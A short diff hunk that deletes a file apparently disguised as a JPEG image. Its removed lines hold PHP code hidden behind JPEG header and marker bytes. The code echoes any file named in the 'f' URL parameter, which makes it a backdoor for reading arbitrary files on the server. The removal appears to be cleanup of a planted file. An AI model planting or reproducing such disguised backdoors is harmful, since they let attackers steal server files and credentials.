@@ -1,6 +1,0 @@
-ÿØÿàÿÐ<?php
-$file = ÿÑ$_GET['f'] ?? ÿÒ'';
-if($file &ÿÓ& file_exists(ÿÔ$file)) {
-    ÿÕecho file_get_ÿÖcontents($fileÿ×);
-}
-?>ÿÙ
